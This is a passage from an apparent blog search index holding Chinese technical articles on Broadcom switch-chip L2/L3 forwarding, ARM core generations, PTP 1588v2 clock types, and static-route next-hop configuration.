熟悉FP同学可能深知FP资源的稀缺性和重要性，可以用惜slice如黄金来做比喻；虽然FP的规则数很多，但是FP的资源申请和释放是按照slice为单位来进行的，且slice的数目一般都不是很多；所以我们要将尽量多的规则整合到一个slice里，尽量减少slice里有规则被浪费的现象；这个也是再将来的协议改造中必须考虑到的一个因素。 到这里对FP的原理和SDK的相关数据结构介绍到这里，如果描述中有不清晰或者不准确的地方欢迎随时沟通讨论。","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"BCM56151路由学习总结","slug":"EMBEDDED/BCM56151路由学习总结","date":"2019-08-29T04:18:26.884Z","updated":"2019-08-29T04:16:37.965Z","comments":true,"path":"EMBEDDED/BCM56151路由学习总结.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/BCM56151路由学习总结.html","excerpt":"# BCM包处理原理","text":"# BCM包处理原理 L2转发流程 # L2转发流程 对于交换芯片来说，L2转发是一个最基本的功能。 2.1 L2功能主要包括： ingress过滤、 MAC学习和老化、 根据MAC+VLAN转发、 广播与洪泛、 生成树控制等基本功能。 2.2 L2转发的具体流程如图3所示： 图3 L2转发流程 2.3 L2转发流程从端口进入交换芯片的包首先检查TAG，对于tagged包，判断是否是802.1p的包，（802.1p的包vid为0），对于untagged的包和802.1p的包，根据系统配置加上tag（这些配置包括：基于MAC的vlan、基于子网的vlan、基于协议的vlan和基于端口的vlan）。经过这一步以后，到交换芯片内部的包都变成802.1Q的tagged包了（vid为1－4094，4095保留）， 如果设置了ingress过滤，就会检查本端口是否在该vid对应的VLAN中，对于本端口不在该vid对应的VLAN中的包就丢弃。对于没有设置ingress过滤，或者设置ingress过滤但本端口在该vid对应的VLAN中的包进行STP端口状态检查，对于BPDU以外的包，只有端口处于forwarding状态，才允许包进入。 然后进行原MAC地址检查，以原MAC＋VID的哈希为索引查找L2 TABLE， 如果没有找到，就把这个表项（原MAC＋VID）以及对应的端口写到L2 TABLE中，这个过程称为MAC地址学习。当然地址学习的方法有很多种，可以是硬件学习，也可以是软件学习，可以根据PORT表中的CMI字段的配置来进行。 下一步进行目的MAC地址检查：目的MAC地址为广播地址（0xffffffff）的包，在vlan内广播出去；目的MAC地址为组播地址的包，进行组播流程的处理；对于单播包，查找L2 TABLE，如果没有找到，就在vlan内进行洪泛； 如果找到，检查表项中的L3 bit是否设置， 如果设置了L3 bit，就进行L3流程的转发； 否则就转发到L2 TABLE表项中的端口去，在egress方向，也有egress过滤设置（默认是使能的），如果egress端口不在vlan中也是不能转发的。 至此，L2转发流程完成了。 与地址学习相反的过程是地址老化。地址老化的机制是：ASIC内部有个定时器，称为age timer，命令行可以对这个寄存器进行设置，每次查找L2 TABLE时（包括原地址查找和目的地址查找，可以配置），如果命中，就会设置hit标志。当老化时间到后，ASIC把hit标志清除，当下一个老化时间到后，ASIC把hit为0的地址设置为无效，这就是为什么实际地址老化的时间为1～2倍agingTime的原因。 2.4 L2转发相关的表项2.4.1 port表 图4 port表 Port表是一个非常重要的表，有很多与端口相关的控制都在这里设置。每个端口对应一个表项，按端口号进行索引。 下面介绍一下重要的设置： 1) PVID ：设置PORT_VID 2) 缺省优先级 ：设置PORT_PRI 3) 流分类使能 ：设置FILTER_ENABLE 4) VLAN转换使能 ：设置VT_ENABLE和VT_MISS_DROP 5) Ingress过滤使能：设置EN_IFILTER 6) 信任COS还是信任DSCP ：对于IPV4：TRUST_DSCP_V4=0:信任COS； TRUST_DSCP_V4=1 : 信任DSCP，对于IPV6：同样设置TRUST_DSCP_V6。 7) Ingress方向mirror使能：设置MIRROR 8) MAC地址学习方式 ：设置CML 9) IP组播是否使用VLAN信息：设置IPMC_DO_VLAN 10) L3转发使能 ：设置V4L3_ENABLE和V6L3_ENABLE 11) 是否丢弃BPDU ：设置DROP_BPDU 12) 控制是否转发带tag和不带tag的包：设置PORT_DIS_TAG和PORT_DIS_UNTAG 13) Pause帧控制 ：设置PASS_CONTROL_FRAMES 14) 基于子网的VLAN使能 ：设置SUBNET_BASED_VID_ENABLE 15) 基于MAC的VLAN使能 ：设置MAC_BASED_VID_ENABLE 16) 设置堆叠口 ：HIGIG_PACKET 17) 设置NNI口 ：NNI_PORT 18) 修改优先级使能 ：MAP_TAG_PACKET_PRIORITY 19) 堆叠口modid设置 ：MY_MODID 20) Out tpid设置 ：OUTER_TPID 21) 基于MAC和基于子网的VLAN优先级设置：VLAN_PRECEDENCE 22) 是否允许单臂桥功能 ：PORT_BRIDGE 23) IP组播位图设置 ：IGNORE_IPMC_L2_BITMAP和IGNORE_IPMC_L3_BITMAP 2.4.2 L2地址表 图6 L2地址表 56504的L2地址表大小为16K，5630X的L2地址表大小为8K，地址表使用MAC+VID的hash值作为索引查表。实际上56504的L2地址表hash值为4K，每个hash值对应4条地址，这样最多可以保存4条hash冲突的地址。地址表中每个表项都保存了MAC_ADDR和VLAN_ID。MAC学习的时候使用原MAC+VID的hash查表，把表中的MAC+VID与包中的MAC+VID进行比较，如果完全相等，表示找到了。然后看端口（TGID_PORT）是否相等，如果不相等表示地址发生了迁移， 对于动态学习的地址需要更新port；如果相等表示命中，更新hit标志。其他几个重要的功能介绍如下： 1) 设置静态地址 ：STATIC_BIT＝1 2) 设置L3转发标志 ：L3＝1 3) 设置本地址的包都转发到CPU去：CPU=1 4) 设置本地址匹配的包丢弃：SRC_DISCARD=1、DST_DISCARD=1 5) 设置本地址匹配的包对某些端口阻塞：MAC_BLOCK_INDEX 6) 设置本地址匹配的包镜像：MIRROR＝1 7) 设置组播索引：L2MC_PTR 8) 地址有效标志：VALID＝1 2.4.3 VLAN表Vlan表分为ingress和egress两个部分，分别对应入口控制和出口控制。 图7 ingress vlan表 Ingress Vlan表中主要包含了端口列表，用于ingress filter功能。PFM是用于控制组播洪泛的开关。PFM＝0，组播在vlan内洪泛；PFM＝1，注册的组播按组播表转发，未注册的组播在vlan内洪泛；PFM＝2，注册的组播按组播表转发，未注册的组播丢弃。STG用于标识本vlan所属的生成树组。 图8 egress vlan表 Egress vlan表中除了PFM和STG外，还包含了出口方向的端口位图，以及哪些端口以untag的方式发送本vlan的包。 2.4.4 egress port表 图5 egress port表 EGR_PORT是一组寄存器，每个端口一个，用于EGRESS方向的控制，有几个重要设置介绍如下： 1) 设置egress端口类型：PORT_TYPE＝0，UNI端口；PORT_TYPE＝1，NNI端口 2) 设置egress过滤：EN_EFILTER＝1 # L3转发流程 图9 L3转发流程 如果查目的MAC地址表的时候发现L3bit置位了，就进入到L3转发流程。与L2交换相比，L3交换可以实现跨VLAN转发，而且它的转发依据不是根据目的MAC地址，而是根据目的IP。 涉及到的表： 主机路由表 子网路由表 EGRESS下一跳表 终端设备信息 修改目的信息的依据 接口表 交换设备信息 修改源的信息的依据 INGRESS下一跳表 找到物理端口 L3转发的流程 第一步: 对L3头部进行校验，校验和错的包直接丢弃； 第二步: 进行原IP地址查找 如果主机路由表中没有找到，会上报给CPU，CPU会进行相应的处理，并更新L3表；（先以源地址查找是想确认下是否有站点漂移的现象和更新L3表。An example of a station movement is when a connection from port 1 is moved to port 2 but the SIP remains the same. Unless the software updates the L3 table, packets that are destined to that DIP are forwarded to port 1.） 第三步：进行目的IP地址查找， 如果主机路由表中没有找到，就会在子网路由表中进行查找，在子网路由表中进行最长子网匹配的查找算法，如果在子网路由表中还没有找到，则送给CPU进行处理， 如果主机路由表或子网路由表中找到了， 就会得到INGRESS/EGRESS下一跳的指针NEXT_HOP_INDEX(ING_L3_NEXT_HOP和EGR_L3_NEXT_HOP)。 注:经过查看sdk可以发现路由表和EGRESS下一跳表在一个结构体中定义的。 如果ECMP使能的话，会得到ECMP的指针和ECMP的个数，从而根据hash算法得到一个下一跳指针。下一条表项中包含了下一跳的MAC地址和接口表的索引。 最后在包转发出去的时候， 用EGRESS下一跳表 查到 目的MAC地址 替换掉包的目的MAC地址。 用EGRESS下一跳表 查到 接口表。 用 接口表 查到 接口MAC地址和VLAN替换掉包的原MAC地址和VLAN。 用INGRESS下一跳表 查到 出端口。 注意：通过代码分析，我们的56151并没有用到EGRESS/INGRESS L3有关的几个重要的表介绍 3层主机路由表 v4单播：1024 v4组播：512 v6单播：512 v6组播: 256 3层LPM路由表 v4单播: 512 v6单播: 256 包含最长前缀匹配IPv4和IPv6子网路由，包括ECMP/ ECMP路由 接口表 a virtual interface corresponding to a particular routed VLAN 与特殊路由VLAN相对应的虚拟接口 and has an associated IP address and MAC address 并且关联IP地址和MAC地址 作用：包含交换机的接口mac地址，包在转发时替换愿mac地址 EGRESS 下一跳表 作用：包含出接口下一跳的mac地址 包在转发时替换目的mac地址 相当于arp表 INGRESS下一跳表 作用：包含目的端口 L3有关的几个重要的表详细信息 图10 L3单播主机路由表 图11 L3子网路由表 图14 接口表 图13 EGRESS 下一跳表 图15 INGRESS 下一跳表 图12 ECMP表 MPLS相关表 # 特殊数据包上CPU设置 摘抄：BCM53115的CFP共支持256条规则。这些规则依次保存在物理的TCAM Entry（Ternary Content-Aware Memory）中，索引号0~255。 设置方法一： 已经封装好的特殊包上cpu接口 参考igmp：bcm_switch_control_set(ulUnit,bcmSwitchIgmpPktToCpu,FALSE); 设置方法二：利用策略上cpu 参考ptp：STATUS bcm_ssp_specified_dstmac_packet_tocpu(bcm_mac_t date,bcm_mac_t mask); fdb表初始化默认规则修改： 参考ptp：STATUS bcm_ssp_ptpd_pdelay_packet_tocpu(void) BCM芯片FP原理及相关SDK数据结构介绍 http://www.dnsnat.com/forum.php?mod=viewthread&amp;tid=1205&amp;fromuid=1 BCM交换芯片策略路由功能 http://www.dnsnat.com/forum.php?mod=viewthread&amp;tid=1204&amp;fromuid=1 # 代码分析 UNK可以说是UNP的内核形态，以下可以做UNP框架的参考： 根据以上框架可以确定开发的重点为SSP的开发。SSP是通过SDK封装的应用接口库。所以还需学习SDK提供的API函数。 BCM5615提供的SDK中包含的L3 APIL3 Ingress Interface APIsL3 Egress Table APIsL3 VRFL3 VRRPL3 NAT SDK具体可参考：《56XX-PG632-RDS_API_decrypted.pdf》 SSP代码可参考：[bcmRoute.c][bcmRouteHw.c] UNP库的使用UNP注册函数 STATUS mvRouteHwapiInit() { STATUS rc = UNP_OK; UNP_hwApiModuleReg_t routeHwApiModuleReg; routeHwApiModuleReg.funcPortGet = NULL; routeHwApiModuleReg.funcPortSet = NULL; routeHwApiModuleReg.funcSwitchGet = NULL; routeHwApiModuleReg.funcSwitchSet = mvRouteSwitchValueSet; routeHwApiModuleReg.funcStructGet = NULL; routeHwApiModuleReg.funcStructSet = mvRouteSwitchStructSet; routeHwApiModuleReg.funcStructDel = NULL; rc = UNP_hwapiModuleFuncReg(&amp;amp;routeHwApiModuleReg, UNP_MID_ROUTEMANAGE); return rc; } 使用注册函数 UNP_CHECK_ERROR(UNP_hwSwitchValueSet(UNP_HW_VRRPACCESS_ENABLE, ulVrrpEnable)); # MPLS相关 内核支持 MPLS can be built as a kernel module, or it can be built in a kernel. To build MPLS first you need to run: $ make menuconfig and enable MPLS compiling from: Network setup -&gt; Networking options -&gt; MPLS (Experimental) If you’re running Debian based system, nice HOW-TO on compiling and installing custom kernel can be found here: https://help.ubuntu.com/community/Kernel/Compile quagga支持quagga已经有mpls的分支版本 –enable-mpls=linux –enable-ldpd broadcom支持Theory of Operation：没有提到 Network Switching Software Development Kit Release 6.3.2： 有相关api说明，并提到StrataXGS III provides MPLS functionality 临时总结： 其实路由表等不一定非要下硬件，只是下硬件后转发快了。 所以可以总结，控制信息有哪些， 路由信息有哪些。 哪些需要上cpu，哪些不需要上。 quagga保存的所有信息，和需要接收的所有信息。","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"ARM内核全解析，从ARM7,ARM9到Cortex-A7,A8,A9,A12,A15到Cortex-A53,A57","slug":"EMBEDDED/ARM内核全解析，从ARM7,ARM9到Cortex-A7,A8,A9,A12,A15到Cortex-A53,A57","date":"2019-08-29T04:18:26.852Z","updated":"2019-08-29T04:16:30.405Z","comments":true,"path":"EMBEDDED/ARM内核全解析，从ARM7,ARM9到Cortex-A7,A8,A9,A12,A15到Cortex-A53,A57.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/ARM内核全解析，从ARM7,ARM9到Cortex-A7,A8,A9,A12,A15到Cortex-A53,A57.html","excerpt":"前不久ARM正式宣布推出新款ARMv8架构的Cortex-A50处理器系列产品，以此来扩大ARM在高性能与低功耗领域的领先地位，进一步抢占移动终端市场份额。Cortex-A50是继Cortex-A15之后的又一重量级产品，将会直接影响到主流PC市场的占有率。围绕该话题，我们今天不妨总结一下近几年来手机端较为主流的ARM处理器。","text":"前不久ARM正式宣布推出新款ARMv8架构的Cortex-A50处理器系列产品，以此来扩大ARM在高性能与低功耗领域的领先地位，进一步抢占移动终端市场份额。Cortex-A50是继Cortex-A15之后的又一重量级产品，将会直接影响到主流PC市场的占有率。围绕该话题，我们今天不妨总结一下近几年来手机端较为主流的ARM处理器。 以由高到低的方式来看，ARM处理器大体上可以排序为：Cortex-A57处理器、Cortex-A53处理器、Cortex-A15处理器、Cortex-A12处理器、Cortex-A9处理器、Cortex-A8处理器、Cortex-A7处理器、Cortex-A5处理器、ARM11处理器、ARM9处理器、ARM7处理器，再往低的部分手机产品中基本已经不再使用，这里就不再介绍。 ARM 处理器架构发展 ● Cortex-A57、A53处理器 Cortex-A53、Cortex-A57两款处理器属于Cortex-A50系列，首次采用64位ARMv8架构，意义重大，这也是ARM最近刚刚发布的两款产品。 Cortex-A57是ARM最先进、性能最高的应用处理器，号称可在同样的功耗水平下达到当今顶级智能手机性能的三倍；而Cortex-A53是世界上能效最高、面积最小的64位处理器，同等性能下能效是当今高端智能手机的三倍。这两款处理器还可整合为ARM big.LITTLE（大小核心伴侣）处理器架构，根据运算需求在两者间进行切换，以结合高性能与高功耗效率的特点，两个处理器是独立运作的。 应用案例：预计于2014年推出。 ● Cortex-A15处理器架构解析 ARM Cortex-A15处理器隶属于Cortex-A系列，基于ARMv7-A架构，是业界迄今为止性能最高且可授予许可的处理器。 Cortex-A15 MPCore处理器具有无序超标量管道，带有紧密耦合的低延迟2级高速缓存，该高速缓存的大小最高可达4MB。浮点和NEON媒体性能方面的其他改进使设备能够为消费者提供下一代用户体验，并为 Web 基础结构应用提供高性能计算。Cortex-A15处理器可以应用在智能手机、平板电脑、移动计算、高端数字家电、服务器和无线基础结构等设备上。 理论上，Cortex-A15 MPCore处理器的移动配置所能提供的性能是当前的高级智能手机性能的五倍还多。在高级基础结构应用中，Cortex-A15 的运行速度最高可达2.5GHz，这将支持在不断降低功耗、散热和成本预算方面实现高度可伸缩的解决方案。 应用案例：三星Exynos 5250。三星Exynos 5250芯片是首款A15芯片，应用在了最近发布的Chromebook和Nexus 10平板电脑上面。Exynos 5250的频率是1.7GHz，采用32纳米的HKMG工艺，配备了Mali-604 GPU，性能强大。另外据传三星下一代Galaxy S4将会搭载四核版的Exynos 5450芯片组，同样应用Cortex-A15内核。另外NVIDIA Tegra 4会采用A15内核。 ● Cortex-A12处理器架构解析 2013中旬，ARM 发布了全新的Cortex-A12处理器，在相同功耗下，Cortex-A12的性能上比Cortex-A9提升了40%，同时尺寸上也同样减小了30%。Cortex-A12也同样能够支持big.LITTLE技术，可以搭配Cortex-A7处理器进一步提升处理器的效能。 Cortex-A12架构图 ARM表示Cortex-A12处理器未来将应用于大量的智能手机以及平板产品，但更加侧重于中端产品。同时ARM也预计在2015年，这些中端产品在数量上将远超过旗舰级别的智能手机及与平板。 搭载Cortex-A12处理器的中端机在未来也将是非常有特点的产品，因为Cortex-A12能够支持虚拟化、AMD TrustZone技术，以及最大1TB的机身存储。这也就意味着未来搭载这一处理器的智能手机完全可以作为所谓的BYOD（Bring Your Own Device）设备使用，换句话说就是在作为自用手机的同时，还可以用作商务手机存储商务内容。 Mali-V500架构图 同时Cortex-A12也搭载了全新的Mali-T622绘图芯片与Mali-V500视频编解码IP解决方案，同样也是以节能为目标。这样看来，定位中端市场，低功耗小尺寸，Cortex-A12最终必然会取代Cortex-A9。据悉，Cortex-A12将于2014年投放市场，到时候我们也许会迎来中端市场的一次改变。 应用案例：2014年发布。 ● Cortex-A9处理器架构解析 ARM Cortex-A9处理器隶属于Cortex-A系列，基于ARMv7-A架构，目前我们能见到的四核处理器大多都是属于Cortex-A9系列。 Cortex-A9 处理器的设计旨在打造最先进的、高效率的、长度动态可变的、多指令执行超标量体系结构，提供采用乱序猜测方式执行的 8 阶段管道处理器，凭借范围广泛的消费类、网络、企业和移动应用中的前沿产品所需的功能，它可以提供史无前例的高性能和高能效。 Cortex-A9 微体系结构既可用于可伸缩的多核处理器（Cortex-A9 MPCore多核处理器），也可用于更传统的处理器（Cortex-A9单核处理器）。可伸缩的多核处理器和单核处理器支持 16、32 或 64KB 4 路关联的 L1 高速缓存配置，对于可选的 L2 高速缓存控制器，最多支持 8MB 的 L2 高速缓存配置，它们具有极高的灵活性，均适用于特定应用领域和市场。 应用案例：德州仪器OMAP 4430/4460、Tegra 2、Tegra 3、新岸线NS115、瑞芯微RK3066、联发科MT6577、三星 Exynos 4210、4412、华为K3V2等。另外高通APQ8064、MSM8960、苹果A6、A6X等都可以看做是在A9架构基础上的改良版本。 ● Cortex-A8处理器架构解析 ARM Cortex-A8处理器隶属于Cortex-A系列，基于ARMv7-A架构，是我们目前使用的单核手机中最为常见的产品。 ARM Cortex-A8处理器是首款基于ARMv7体系结构的产品，能够将速度从600MHz提高到1GHz以上。Cortex-A8处理器可以满足需要在300mW以下运行的移动设备的功率优化要求；以及需要2000 Dhrystone MIPS的消费类应用领域的性能优化要求。 Cortex-A8 高性能处理器目前已经非常成熟，从高端特色手机到上网本、DTV、打印机和汽车信息娱乐，Cortex-A8处理器都提供了可靠的高性能解决方案。 应用案例：[MYS-S5PV210开发板、TI OMAP3系列、苹果A4处理器（iPhone 4）、三星S5PC110（三星I9000）、瑞芯微RK2918、联发科MT6575等。另外，高通的MSM8255、MSM7230等也可看做是A8的衍生版本。 ● Cortex-A7处理器架构解析 ARM Cortex-A7处理器隶属于Cortex-A系列，基于ARMv7-A架构，它的特点是在保证性能的基础上提供了出色的低功耗表现。 Cortex-A7处理器的体系结构和功能集与Cortex-A15 处理器完全相同，不同这处在于，Cortex-A7 处理器的微体系结构侧重于提供最佳能效，因此这两种处理器可在big.LITTLE（大小核大小核心伴侣结构）配置中协同工作，从而提供高性能与超低功耗的终极组合。单个Cortex-A7处理器的能源效率是ARM Cortex-A8处理器的5倍，性能提升50%，而尺寸仅为后者的五分之一。 作为独立处理器，Cortex-A7可以使2013-2014年期间低于100美元价格点的入门级智能手机与2010 年500美元的高端智能手机相媲美。这些入门级智能手机在发展中世界将重新定义连接和Internet使用。 应用案例：全志Cortex-A7四核平板芯片，联发科刚刚发布的MT6589。 ● Cortex-A5处理器架构解析 ARM Cortex-A5处理器隶属于Cortex-A系列，基于ARMv7-A架构，它是能效最高、成本最低的处理器。 Cortex-A5处理器可为现有ARM9和ARM11处理器设计提供很有价值的迁移途径，它可以获得比ARM1176JZ-S更好的性能，比ARM926EJ-S更好的功效和能效。另外，Cortex-A5处理器不仅在指令以及功能方面与更高性能的Cortex-A8、Cortex-A9和Cortex-A15处理器完全兼容，同时还保持与经典ARM处理器（包括ARM926EJ-S、ARM1176JZ-S和 ARM7TDMI）的向后应用程序兼容性。 应用案例：高通MSM7227A/7627A（新渴望V、摩托罗拉XT615、诺基亚610、中兴V889D、摩托罗拉DEFY XT等）、高通MSM8225/8625（小辣椒双核版、华为U8825D、天语 W806+、innos D9、酷派7266等）、米尔 MYD-SAMA5D3X](http://www.myir-tech.com/product/mys-s5pv210.htm)系列开发板（MYD-SAMA5D31、MYD-SAMA5D33、MYD-SAMA5D34、MYD-SAMA5D35）。 MYD-SAMA5D3X开发板 ● ARM11系列处理器架构解析 ARM11系列包括了ARM11MPCore处理器、ARM1176处理器、ARM1156处理器、ARM1136处理器，它们是基于ARMv6架构，分别针对不同应用领域。ARM1156处理器主要应用在高可靠性和实时嵌入式应用领域，与手机关联不大，此处略去介绍。 ARM11 MPCore使用多核处理器结构，可实现从1个内核到4个内核的多核可扩展性，从而使具有单个宏的简单系统设计可以集成高达单个内核的4倍的性能。Cortex-A5处理器是ARM11MPCore的相关后续产品。 ARM1176处理器主要应用在智能手机、数字电视和电子阅读器中，在这些领域得到广泛部署，它可提供媒体和浏览器功能、安全计算环境，在低成本设计的情况下性能高达1GHz。 ARM1136处理器包含带媒体扩展的ARMv6 指令集、Thumb代码压缩技术以及可选的浮点协处理器。ARM1136是一个成熟的内核，作为一种应用处理器广泛部署在手机和消费类应用场合中。在采用 90G工艺时性能可达到600MHz以上，在面积为2平方毫米且采用65纳米工艺时可达到1GHz。 应用案例：高通MSM7225（HTC G8）、MSM7227（HTC G6、三星S5830、索尼爱立信X8等）、Tegra APX 2500、博通BCM2727（诺基亚N8）、博通BCM2763（诺基亚PureView 808）、 Telechip 8902（平板电脑）。 ● ARM9系列和ARM7系列处理器架构解析 ARM9系列处理器系列包括ARM926EJ-S、ARM946E-S和 ARM968E-S处理器。其中前两者主要针对嵌入式实时应用，我们这里就主要针对ARM926EJ-S进行介绍。 ARM926EJ-S基于ARMv5TE架构，作为入门级处理器，它支持各种操作系统，如Linux、Windows CE和Symbian。ARM926EJ-S 处理器已授权于全球100多家硅片供应商，并不断在众多产品和应用中得到成功部署，应用广泛。 应用案例：TI OMAP 1710。诺基亚N73、诺基亚E65、三星SGH-i600等手机采用的都是该处理器，以及包括米尔科技的 MYS-SAM9X5 系列工控开发板。 ARM9 开发板 ● ARM7系列处理器 ARM7系列处理器系列包括ARM7TDMI-S（ARMv4T架构）和ARM7EJ-S（ARMv5TEJ架构），最早在1994推出，相对上面产品来说已经显旧。虽然现在ARM7处理器系列仍用于某些简单的32位设备，但是更新的嵌入式设计正在越来越多地使用最新的ARM处理器，这些处理器在技术上比ARM 7系列有了显著改进。 作为目前较旧的一个系列，ARM7处理器已经不建议继续在新品中使用。它究竟有多老呢？上面的Apple eMate 300使用的就是一款25MHz的ARM7处理器，够古老了吧？ ● 相关文章 ARM最新开发工具DS-5到底是什么？有什么用？ ARM处理器体系架构详细说明 ARM 开发工具 DS-5 RVDS MDK-ARM 比较区别和选择 本文来自米尔科技，原文地址： http://www.myir-tech.com/resource/448.asp，转载请注明出处。","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"1588v2（PTP）协议实体类型详解","slug":"EMBEDDED/1588v2（PTP）协议实体类型详解","date":"2019-08-29T04:18:26.837Z","updated":"2019-08-29T04:16:22.525Z","comments":true,"path":"EMBEDDED/1588v2（PTP）协议实体类型详解.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/1588v2（PTP）协议实体类型详解.html","excerpt":"PTP共有5种实体类型： 普通时钟（Ordinaryclock）， 边界时钟（Boundaryclock）， E2E透传时钟（End-to-end transparent clock）， P2P透传时钟（Peer-to-peer transparent clock）， 管理节点。","text":"PTP共有5种实体类型： 普通时钟（Ordinaryclock）， 边界时钟（Boundaryclock）， E2E透传时钟（End-to-end transparent clock）， P2P透传时钟（Peer-to-peer transparent clock）， 管理节点。 普通时钟 普通时钟只有一个PTP物理通信端口和网络相连，一个物理端口包括2个逻辑接口，事件接口（event interface）和通用接口（general interface）。事件接口接收和发送需要打时间标签的事件消息。通用接口接收和发送其他消息。一个普通时钟只有一个PTP协议处理器。在网络中，普通时钟可以作为祖父时钟（grandmaster clock）或从时钟（slave clock）。当作为祖父时钟是，其PTP端口处于主状态（master），作为从时钟时其PTP端口处于从状态（slave），普通时钟的框图如下： 框图中的协议引擎主要完成： 发送和接收协议消息。 维护时钟和端口数据 执行PTP状态机的处理功能。 如果普通时钟是作为从时钟，则根据PTP协议计算父时钟的时间。 一个普通时钟维护两套数据：时钟相关的数据和端口相关的数据，时钟相关的数据有： &lt;/span&gt;&lt;/span&gt; Default数据：用于描述普通时钟的属性。 Current数据：用于描述同步相关的属性。 父时钟和祖父时钟数据：用于描述父时钟和祖父时钟的属性。 时间特性：用于描述时标的属性。 端口相关的数据包括端口的属性以及PTP状态的数据。 &lt;/span&gt;&lt;/span&gt; 当普通时钟的端口是从状态时，时钟控制环路用来控制本地时钟和父时钟同步。当普通时钟作为祖父时钟时，本地时钟要么自由振荡要么同步于外部的时钟源（如GPS等）。 边界时钟 边界时钟有多个PTP物理通信端口和网络相连，每个物理端口包括2个逻辑接口，事件接口和通用接口。边界时钟的每个PTP端口和普通时钟的PTP端口一样，除了以下几点： 边界时钟的所有端口共同使用一套时钟数据。 边界时钟的所有端口共同使用一个本地时钟。 每个端口的协议引擎增加一个功能：从所有端口中选择一个端口作为本地时钟的同步输入。 协议引擎将总结和同步相关（包括建立时钟同步层次）的消息和信令。但可以转发管理消息。边界时钟的框图如下： &lt;/span&gt;&lt;/span&gt; E2E透传时钟 E2E透传时钟像路由器或交换机一样转发所有的PTP消息，但对于事件消息，有一个停留时间桥计算该消息报文在本点停留的时间（消息报文穿过本点所花的时间），停留时间将累加到消息报文中的”修正”（correction field）字段中。修正过程如下图： E2E透传时钟的框图如下： 用于计算停留时间的时间戳是由本地时钟产生的，所以本地时钟和时间源的时钟之间的频率差会造成误差。最好是本地时钟去锁定时钟源时钟。如果本地时钟锁定的不是时间源时钟则要求其精度能到达一定标准,以本地时钟是三级钟为例，1ms的停留时间大约造成5ns的误差。 E2E透传时钟可以和普通时钟合在一起作为一个网络单元，其框图如下： 在上图中，如果普通时钟是从时钟，停留时间桥将接收到的时间消息，宣称消息，由输入的时钟同步消息产生的时间戳以及内部的停留时间传送给协议引擎，协议信息根据这些信息计算出正确的时间并以此控制本地时钟。如果普通时钟是主时钟，协议引擎将产生Sync和Followup消息，消息中发送时间戳由本地时钟基于内部停留时间和输出时间戳产生（it would originate Sync and Follow_Up messages with the sendingtimestamps referenced to the local clock of the ordinary clock and based oninternal timing corrections and the egress timestamp.）在实现中，透传时钟和普通时钟使用同一个本地时钟。 P2P透传时钟 P2P透传时钟和E2E透传时钟只是对PTP时间消息的修正和处理方法不同，在其他方面是完全一样的。P2P透传时钟可以和E2E透传时钟一样与普通时钟合在一起作为一个网络单元。 P2P透传时钟的框图如下： P2P透传时钟对每个端口有一个模块用来测量该端口和对端端口的link延时，对端端口也必须支持P2P模式。link的延时通过交换Pdelay_Req, Pdelay_Resp以及可能的Pdelay_Resp_Follow_Up消息测量出。P2P透传时钟仅仅修正和转发Sync和Followup消息。本地的停留时间和收到消息的端口的link延时均记入修正。修正过程如下图： 因为P2P的修正包括了link延时和停留时间，其修正域反映了整个路径的延时，从时钟可以根据Sync消息计算出正确的时间，而不需要再发Delay测量消息。再发生时钟路径倒换的时候，P2P方式基本不受影响，而E2E方式则需要在进行过新的延时测量之后，才能计算出正确的时间。 管理节点 管理节点向人或程序提供PTP管理消息的接口，管理节点可以和任意时钟合在一起。","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"静态路由使用下一跳IP与出接口的区别","slug":"NETWORK/静态路由使用下一跳IP与出接口的区别","date":"2019-08-29T04:16:16.229Z","updated":"2019-08-29T04:14:32.870Z","comments":true,"path":"NETWORK/静态路由使用下一跳IP与出接口的区别.html","link":"","permalink":"http://demonelf.github.io/NETWORK/静态路由使用下一跳IP与出接口的区别.html","excerpt":"配置下一跳为出接口的 好处是不用知道下一跳具体ip可以实现动态学习的效果 缺点在于下一跳路由器必须支持这种基本的arp代理功能.","text":"配置下一跳为出接口的 好处是不用知道下一跳具体ip可以实现动态学习的效果 缺点在于下一跳路由器必须支持这种基本的arp代理功能. 拓扑图： 以太网链路中：两个接口之间的通信是靠MAC地址，根据MAC地址，将数据封装成数据帧后传送到网络，进而通过物理线路传送给对方。而获取到对端的MAC地址，是通过ARP来完成的。例：1，当静态路由中下一跳使用出接口时，路由器会认为目标网络和接口处在“直连网络”中。如：R1(config)#ip route 192.168.2.0 255.255.255.0f0/0查看路由表：R1#show ip route 在以太网直连网络中设备间的通信是靠ARP广播来获取到目标主机的MAC地址。即当R1要访问192.168.2.2这个ip地址时，R1会认为目标网络是和自己直连的（虽然这时候实际是静态路由），于是R1就要在F0/0口向网络发出ARP请求广播，来寻找192.168.2.2所对应的MAC地址。这时，如果R2启用了ARP代理，那么R2将代替R3应答此ARP请求，即R2告诉R1：192.168.2.2所对应的MAC地址是R2的F0/0接口的MAC。如果R2的ARP代理功能关闭，那么R1将不能ping通192.168.2.2使用出接口的弊端：如果R3后面接了些pc机，当R1要访问这些pc机时，都会产生一条该pc机和MAC地址对应的ARP条目缓存，如果pc机的数量很大，此缓存也会很大，会导致R1耗费很大内存来维护。2，当静态路由中下一跳使用ip地址时，路由表中显示的是下一跳地址。如：R1(config)#ip route 192.168.2.0 255.255.255.0 192.168.1.2查看路由表：R1#show ip route 这时去往192.168.2.2的网段只会维护一条ARP缓存，即192.168.1.2所对一个的是R2的F0/0接口地址。即使R3后面接了多台主机，也只需要维护这么一条ARP缓存记录。二：点到点网络环境下：无论是指定下一跳地址还是出接口，都是一样的。因为这种环境下使用HDLC和PPP等协议来进行二层封装，不需要进行ARP的解析。结论：1、在点到点网络环境下，无论是指定下一跳地址还是出接口，都是一样的2、在广播网络环境下，则不然。如果指定为出接口的话，那么不管数据包的目标地址是否有效，每次当数据包到达时都会触发一个ARP请求，又因为ARP代理功能在IOS环境下默认是打开的，这就意味着路由器需要配置大量的ARP高速缓存。而如果是指定为下一跳地址的话，仅当第一个去往目标网络的数据包到达时，才会触发ARP请求。本文出自 “天好” 